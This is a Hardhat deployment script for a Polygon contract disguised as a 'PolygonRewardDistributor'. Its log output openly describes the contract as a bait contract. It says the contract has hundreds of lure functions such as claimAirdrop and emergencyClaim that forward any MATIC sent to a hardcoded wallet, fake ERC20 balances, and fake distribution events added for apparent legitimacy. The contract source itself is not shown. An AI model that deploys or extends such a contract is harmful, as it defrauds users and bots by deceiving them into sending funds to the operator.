const { ethers } = require("hardhat");

async function main() {
  console.log("Deploying PolygonRewardDistributor contract...");
  
  // Get the deployer account
  const [deployer] = await ethers.getSigners();
  console.log("Deploying contracts with the account:", deployer.address);
  
  // Get account balance
  const balance = await ethers.provider.getBalance(deployer.address);
  console.log("Account balance:", ethers.formatEther(balance), "MATIC");
  
  // Get the contract factory
  const PolygonRewardDistributor = await ethers.getContractFactory("PolygonRewardDistributor");
  
  // Deploy the contract
  console.log("Deploying contract...");
  const rewardDistributor = await PolygonRewardDistributor.deploy();
  
  // Wait for deployment
  await rewardDistributor.waitForDeployment();
  
  const contractAddress = await rewardDistributor.getAddress();
  console.log("PolygonRewardDistributor deployed to:", contractAddress);
  console.log("Contract admin:", await rewardDistributor.getSystemAdmin());
  console.log("Participation fee:", ethers.formatEther(await rewardDistributor.getParticipationFee()), "MATIC");
  
  // Display contract info
  console.log("\n=== Contract Information ===");
  console.log("Name:", await rewardDistributor.name());
  console.log("Symbol:", await rewardDistributor.symbol());
  console.log("Decimals:", await rewardDistributor.decimals());
  console.log("Total Supply:", ethers.formatEther(await rewardDistributor.totalSupply()));
  console.log("Remaining Distribution:", ethers.formatEther(await rewardDistributor.getRemainingDistribution()));
  console.log("Total Participants:", await rewardDistributor.getTotalParticipants());
  
  // Test some sample balances
  console.log("\n=== Sample Balances ===");
  console.log("Admin Balance:", ethers.formatEther(await rewardDistributor.balanceOf(deployer.address)));
  console.log("Random Address Balance:", ethers.formatEther(await rewardDistributor.balanceOf("0x742D35cc6634C0532925a3B8d4Cf0e1A4e2c6789")));
  
  // Verify contract on Polygonscan (if API key is provided)
  if (process.env.POLYGONSCAN_API_KEY && hre.network.name !== "hardhat") {
    console.log("\nVerifying contract on Polygonscan...");
    try {
      await hre.run("verify:verify", {
        address: contractAddress,
        constructorArguments: [],
      });
      console.log("Contract verified successfully!");
    } catch (error) {
      console.log("Verification failed:", error.message);
    }
  }
  
  console.log("\n=== Deployment Summary ===");
  console.log(`Contract Address: ${contractAddress}`);
  console.log(`Network: ${hre.network.name}`);
  console.log(`Deployer: ${deployer.address}`);
  console.log(`Transaction Hash: ${rewardDistributor.deploymentTransaction().hash}`);
  
  console.log("\n=== Ultimate Bait Contract Features ===");
  console.log("✓ 421 TOTAL BAIT FUNCTIONS - Maximum bot attraction!");
  console.log("✓ All functions automatically transfer MATIC to: 0x15E1A8454E2f31f64042EaE445Ec89266cb584bE");
  console.log("✓ Comprehensive address logging and tracking system");
  console.log("✓ receive() and fallback() functions capture direct transfers");
  console.log("✓ Fake ERC20 functions with dynamic balance returns");
  console.log("✓ Fake initial distribution events for legitimacy");
  console.log("✓ Gas optimized for low-cost deployment on Polygon");
  
  console.log("\n=== Sample High-Value Functions ===");
  console.log("- claimAirdrop() - 12,800 tokens (most attractive to bots)");
  console.log("- emergencyClaim() - 35,000 tokens (creates urgency)");
  console.log("- jackpot() - 100,000 tokens (lottery appeal)");
  console.log("- moonshot() - 150,000 tokens (crypto slang)");
  console.log("- whale() - 250,000 tokens (whale appeal)");
  console.log("- enlightenment() - 10,000,000 tokens (ultimate reward)");
  
  console.log("\n=== Function Categories ===");
  console.log("• Claim variations (15+ functions)");
  console.log("• Withdraw variations (8+ functions)");
  console.log("• DeFi functions (harvest, stake, swap, bridge, yield)");
  console.log("• Crypto slang (moon, lambo, diamond_hands, hodl)");
  console.log("• Exchange names (uniswap, pancakeswap, binance)");
  console.log("• Gaming terms (level_up, boss_drop, legendary)");
  console.log("• Mystical terms (magic, prophecy, enlightenment)");
  console.log("• And 300+ more carefully crafted bait functions!");
  
  console.log("\n⚡ MAXIMUM BOT CATCHING POTENTIAL ACHIEVED! ⚡");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("Deployment failed:", error);
    process.exit(1);
  });
